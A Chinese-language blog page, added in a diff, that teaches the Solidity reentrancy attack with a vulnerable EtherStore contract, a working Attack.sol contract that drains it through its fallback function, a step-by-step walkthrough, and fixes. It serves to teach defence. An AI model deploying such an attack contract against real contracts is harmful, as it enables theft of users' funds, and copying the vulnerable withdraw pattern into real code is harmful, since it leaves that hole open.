@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"lyuane.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.9.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="0x01 重入攻击重入攻击是由于solidity智能合约的特性，再加上编写不当造成的。 主要流程为：攻击者编写攻击合约，调用受害合约，利用自己的fallback函数，循环调用受害合约的代码。 臭名昭著的DAO攻击就是因为当时他们的智能合约中存在Re-Entrancy这个bug，ETC也是因为这个bug，硬分叉产生出来的链。 0x02 fallback()函数根据官方文档v0.6.3介绍，fallb">
+<meta property="og:type" content="article">
+<meta property="og:title" content="智能合约安全-Reentrancy(重入攻击)">
+<meta property="og:url" content="http://lyuane.github.io/2020/02/23/2020-02-23-%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8-Reentrancy(%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB)/index.html">
+<meta property="og:site_name" content="沄渊">
+<meta property="og:description" content="0x01 重入攻击重入攻击是由于solidity智能合约的特性，再加上编写不当造成的。 主要流程为：攻击者编写攻击合约，调用受害合约，利用自己的fallback函数，循环调用受害合约的代码。 臭名昭著的DAO攻击就是因为当时他们的智能合约中存在Re-Entrancy这个bug，ETC也是因为这个bug，硬分叉产生出来的链。 0x02 fallback()函数根据官方文档v0.6.3介绍，fallb">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-02-22T16:00:00.000Z">
+<meta property="article:author" content="沄渊">
+<meta property="article:tag" content="Blockchain">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://lyuane.github.io/2020/02/23/2020-02-23-%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8-Reentrancy(%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB)/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://lyuane.github.io/2020/02/23/2020-02-23-%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8-Reentrancy(%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB)/","path":"2020/02/23/2020-02-23-智能合约安全-Reentrancy(重入攻击)/","title":"智能合约安全-Reentrancy(重入攻击)"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>智能合约安全-Reentrancy(重入攻击) | 沄渊</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">沄渊</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">守得云开见月明</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB"><span class="nav-number">1.</span> <span class="nav-text">0x01 重入攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-fallback-%E5%87%BD%E6%95%B0"><span class="nav-number">2.</span> <span class="nav-text">0x02 fallback()函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%AE%9E%E4%BE%8B"><span class="nav-number">3.</span> <span class="nav-text">0x03 实例</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E9%A2%84%E9%98%B2"><span class="nav-number">4.</span> <span class="nav-text">0x04 预防</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-Refer"><span class="nav-number">5.</span> <span class="nav-text">0x05 Refer</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="沄渊"
+      src="/images/avatar.jpeg">
+  <p class="site-author-name" itemprop="name">沄渊</p>
+  <div class="site-description" itemprop="description">路漫漫其修远兮,吾将上下而求索</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">43</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://lyuane.github.io/2020/02/23/2020-02-23-%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8-Reentrancy(%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpeg">
+      <meta itemprop="name" content="沄渊">
+      <meta itemprop="description" content="路漫漫其修远兮,吾将上下而求索">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="沄渊">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          智能合约安全-Reentrancy(重入攻击)
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-02-23 00:00:00" itemprop="dateCreated datePublished" datetime="2020-02-23T00:00:00+08:00">2020-02-23</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="0x01-重入攻击"><a href="#0x01-重入攻击" class="headerlink" title="0x01 重入攻击"></a>0x01 重入攻击</h2><p>重入攻击是由于solidity智能合约的特性，再加上编写不当造成的。</p>
+<p>主要流程为：攻击者编写攻击合约，调用受害合约，利用自己的fallback函数，循环调用受害合约的代码。</p>
+<p>臭名昭著的DAO攻击就是因为当时他们的智能合约中存在Re-Entrancy这个bug，ETC也是因为这个bug，硬分叉产生出来的链。</p>
+<h2 id="0x02-fallback-函数"><a href="#0x02-fallback-函数" class="headerlink" title="0x02 fallback()函数"></a>0x02 fallback()函数</h2><p>根据<a target="_blank" rel="noopener" href="https://solidity.readthedocs.io/en/v0.6.3/contracts.html#fallback-function">官方文档v0.6.3介绍</a>，fallback函数介绍如下</p>
+<blockquote>
+<p>A contract can have at most one <code>fallback</code> function, declared using <code>fallback () external [payable]</code>(without the <code>function</code> keyword). This function cannot have arguments, cannot return anything and must have <code>external</code> visibility. It is executed on a call to the contract if none of the other functions match the given function signature, or if no data was supplied at all and there is no <a target="_blank" rel="noopener" href="https://solidity.readthedocs.io/en/v0.6.3/contracts.html#receive-ether-function">receive Ether function</a>. The fallback function always receives data, but in order to also receive Ether it must be marked <code>payable</code>.</p>
+</blockquote>
+<p>也就是说在如下两种情况下会执行fallback()函数</p>
+<ul>
+<li>当外部账户或其他合约向该合约地址发送 ether 时；</li>
+<li>当外部账户或其他合约调用了该合约一个不存在的函数时；</li>
+</ul>
+<p>note：一个没有定义回退函数的合约，如果接收ether，会触发异常，并返还ether（solidity v0.4.0开始）。所以合约要接收ether，必须实现回退函数。</p>
+<p>如下所示:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Test &#123;</span><br><span class="line">    <span class="comment">// This function is called for all messages sent to</span></span><br><span class="line">    <span class="comment">// this contract (there is no other function).</span></span><br><span class="line">    <span class="comment">// Sending Ether to this contract will cause an exception,</span></span><br><span class="line">    <span class="comment">// because the fallback function does not have the &quot;payable&quot;</span></span><br><span class="line">    <span class="comment">// modifier.</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; x = <span class="number">1</span>; &#125;</span><br><span class="line">    uint x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// This contract keeps all Ether sent to it with no way</span></span><br><span class="line"><span class="comment">// to get it back.</span></span><br><span class="line">contract Sink &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">payable</span> </span>&#123; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Caller &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">callTest</span>(<span class="params">Test test</span>) </span>&#123;</span><br><span class="line">        test.call(<span class="number">0xabcdef01</span>); <span class="comment">// hash does not exist</span></span><br><span class="line">        <span class="comment">// results in test.x becoming == 1.</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// The following call will fail, reject the</span></span><br><span class="line">        <span class="comment">// Ether and return false:</span></span><br><span class="line">        test.send(<span class="number">2</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x03-实例"><a href="#0x03-实例" class="headerlink" title="0x03 实例"></a>0x03 实例</h2><p>引用自<a target="_blank" rel="noopener" href="https://blog.sigmaprime.io/solidity-security.html">https://blog.sigmaprime.io/solidity-security.html</a></p>
+<p>为了说明重入攻击流程，考虑如下合约。</p>
+<p>EtherStore.sol：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//该合约充当以太坊保险库，允许存款人每周只提取 1 个 Ether。</span></span><br><span class="line">contract EtherStore &#123;</span><br><span class="line"></span><br><span class="line">    uint256 public withdrawalLimit = <span class="number">1</span> ether;</span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint256) public lastWithdrawTime;</span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint256) public balances;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">depositFunds</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">withdrawFunds</span> (<span class="params">uint256 _weiToWithdraw</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(balances[msg.sender] &gt;= _weiToWithdraw);</span><br><span class="line">        <span class="comment">// limit the withdrawal</span></span><br><span class="line">        <span class="built_in">require</span>(_weiToWithdraw &lt;= withdrawalLimit);</span><br><span class="line">        <span class="comment">// limit the time allowed to withdraw</span></span><br><span class="line">        <span class="built_in">require</span>(now &gt;= lastWithdrawTime[msg.sender] + <span class="number">1</span> weeks);</span><br><span class="line">        <span class="built_in">require</span>(msg.sender.call.value(_weiToWithdraw)());</span><br><span class="line">        balances[msg.sender] -= _weiToWithdraw;</span><br><span class="line">        lastWithdrawTime[msg.sender] = now;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>该合约有两个公共职能。 <code>depositFunds()</code> 和 <code>withdrawFunds()</code> 。</p>
+<p>该 <code>depositFunds()</code> 功能只是增加发件人余额。</p>
+<p>该 <code>withdrawFunds()</code> 功能允许发件人指定要撤回的 wei 的数量。如果所要求的退出金额小于 1Ether 并且在上周没有发生撤回，它才会成功。</p>
+<p><strong>那么漏洞出现在哪呢？</strong></p>
+<p><strong>漏洞出现在17行<code>require(msg.sender.call.value(_weiToWithdraw)());</code></strong></p>
+<p><strong>当该合约向用户发送ether时，就会调用用户的fallback函数。</strong></p>
+<p><strong>如果该用户是恶意的，就可以通过修改自己的fallback函数来控制程序流程。</strong></p>
+<p>考虑如下攻击合约</p>
+<p>Attack.sol：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;EtherStore.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">  EtherStore public etherStore;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// intialise the etherStore variable with the contract address</span></span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">address _etherStoreAddress</span>)</span> &#123;</span><br><span class="line">      etherStore = EtherStore(_etherStoreAddress);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">pwnEtherStore</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">      <span class="comment">// attack to the nearest ether</span></span><br><span class="line">      <span class="built_in">require</span>(msg.value &gt;= <span class="number">1</span> ether);</span><br><span class="line">      <span class="comment">// send eth to the depositFunds() function</span></span><br><span class="line">      etherStore.depositFunds.value(<span class="number">1</span> ether)();</span><br><span class="line">      <span class="comment">// start the magic</span></span><br><span class="line">      etherStore.withdrawFunds(<span class="number">1</span> ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">collectEther</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">      msg.sender.transfer(<span class="built_in">this</span>.balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// fallback function - where the magic happens</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="title">payable</span> </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (etherStore.balance &gt; <span class="number">1</span> ether) &#123;</span><br><span class="line">          etherStore.withdrawFunds(<span class="number">1</span> ether);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>攻击者可以（假定恶意合约地址为 <code>0x0...123</code>）使用 <code>EtherStore</code> 合约地址作为构造函数参数来创建上述合约。这将初始化并将公共变量 <code>etherStore</code> 指向我们想要攻击的合约。</p>
+<p>然后攻击者会调用这个 <code>pwnEtherStore()</code> 函数，并存入一些 Ehter（大于或等于1），比方说 1Ehter，在这个例子中。在这个例子中，我们假设一些其他用户已经将若干 Ehter 存入这份合约中，比方说它的当前余额就是 <code>10 ether</code> 。然后会发生以下情况：</p>
+<ol>
+<li>Attack.sol - 第15行- EtherStore 合约的 depositFunds() 函数将被调用，其中msg.value 为1 Ether（以及大量的Gas）。发件人（msg.sender）将是我们的恶意合约（0x0 … 123）。因此，balances[0x0..123] = 1Ether。</li>
+<li>Attack.sol - 第17行- 然后恶意合约将使用1 ether的参数调用EtherStore合约的withdrawFunds()函数。这将通过所有require语句（EtherStore合约的第[12] - [16]行），因为我们之前没有提取过。</li>
+<li>EtherStore.sol - 第17行- 然后合约将1以太币发回恶意合约。</li>
+<li>Attack.sol - 第25行- 发送给恶意合约的以太币将执行回退函数。</li>
+<li>Attack.sol - 第26行- EtherStore 合约的总余额为10个以太币，现在为9个以太币，因此if语句通过。</li>
+<li>Attack.sol - 第27行– 回退函数再次调用 EtherStore 的 withdrawFunds() 函数并“重新进入” EtherStore 合约。</li>
+<li>EtherStore.sol - 第11行- 在第二次调用 withdrawFunds() 时，我们的余额仍为1以太，因为第18行尚未执行。因此，我们仍然有 balances[0x0..123] = 1 Ether。lastWithdrawTime 变量也是如此。我们再次通过了所有要求。</li>
+<li>EtherStore.sol - 第17行- 我们提取另外1个以太币。</li>
+<li>步骤4-8将重复- 直到 EtherStore.balance&lt;= 1，如 Attack.sol 中的第26行所示。</li>
+<li>Attack.sol - 第26行 - 一旦 EtherStore 合约中剩下不多于1（或更少）的ether，则此if语句将失败。然后，这将允许执行 EtherStore 合约的第18和19行（对于withdrawFunds()函数的每次调用）。</li>
+<li>EtherStore.sol – 第18和19行- 将设置 balances 和 lastWithdrawTime 映射，执行将结束。</li>
+</ol>
+<p>最终的结果是，攻击者只用一笔交易，便立即从 EtherStore 合约中取出了（除去 1 个 Ether 以外）所有的 Ether。</p>
+<h2 id="0x04-预防"><a href="#0x04-预防" class="headerlink" title="0x04 预防"></a>0x04 预防</h2><ul>
+<li><p>在发送ether时使用内置的<code>transfer()</code>函数(仅使用2300gas，不足以call其他合约)</p>
+</li>
+<li><p>确保所有更改状态变量的逻辑都在以太币被发送出合同（或任何外部调用）之前发生。</p>
+<p>​    比如在<code>EtherStore</code>示例中，第[18]和[19]行<code>EtherStore.sol</code>应放在第[17]行之前</p>
+</li>
+<li><p>引入互斥锁。也就是说，添加一个状态变量，在代码执行期间锁定合约，防止重入调用。</p>
+</li>
+</ul>
+<p>将所有这些技术（这三项都是不必要的，但都是出于说明目的）应用于<code>EtherStore.sol</code>，可以得到无重入合同：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">contract EtherStore &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// initialise the mutex</span></span><br><span class="line">    bool reEntrancyMutex = <span class="literal">false</span>;</span><br><span class="line">    uint256 public withdrawalLimit = <span class="number">1</span> ether;</span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint256) public lastWithdrawTime;</span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint256) public balances;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">depositFunds</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">withdrawFunds</span> (<span class="params">uint256 _weiToWithdraw</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(!reEntrancyMutex);</span><br><span class="line">        <span class="built_in">require</span>(balances[msg.sender] &gt;= _weiToWithdraw);</span><br><span class="line">        <span class="comment">// limit the withdrawal</span></span><br><span class="line">        <span class="built_in">require</span>(_weiToWithdraw &lt;= withdrawalLimit);</span><br><span class="line">        <span class="comment">// limit the time allowed to withdraw</span></span><br><span class="line">        <span class="built_in">require</span>(now &gt;= lastWithdrawTime[msg.sender] + <span class="number">1</span> weeks);</span><br><span class="line">        balances[msg.sender] -= _weiToWithdraw;</span><br><span class="line">        lastWithdrawTime[msg.sender] = now;</span><br><span class="line">        <span class="comment">// set the reEntrancy mutex before the external call</span></span><br><span class="line">        reEntrancyMutex = <span class="literal">true</span>;</span><br><span class="line">        msg.sender.transfer(_weiToWithdraw);</span><br><span class="line">        <span class="comment">// release the mutex after the external call</span></span><br><span class="line">        reEntrancyMutex = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x05-Refer"><a href="#0x05-Refer" class="headerlink" title="0x05 Refer"></a>0x05 Refer</h2><p><a target="_blank" rel="noopener" href="https://solidity.readthedocs.io/en/v0.6.3/contracts.html#fallback-function">https://solidity.readthedocs.io/en/v0.6.3/contracts.html#fallback-function</a></p>
+<p><a target="_blank" rel="noopener" href="https://solidity.tryblockchain.org/14825685263030.html">https://solidity.tryblockchain.org/14825685263030.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.sigmaprime.io/solidity-security.html#re-vuln">https://blog.sigmaprime.io/solidity-security.html#re-vuln</a></p>
+<p><a target="_blank" rel="noopener" href="https://lalajun.github.io/2018/08/29/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8-%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/">https://lalajun.github.io/2018/08/29/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8-%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/</a></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1413221">https://cloud.tencent.com/developer/article/1413221</a></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/601/#3-fallback">https://paper.seebug.org/601/#3-fallback</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Blockchain/" rel="tag"># Blockchain</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/01/30/2020-01-30-java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%9F%BA%E7%A1%80/" rel="prev" title="Java多线程基础">
+                  <i class="fa fa-chevron-left"></i> Java多线程基础
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020/03/05/2020-03-05-%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8/" rel="next" title="智能合约安全">
+                  智能合约安全 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">沄渊</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
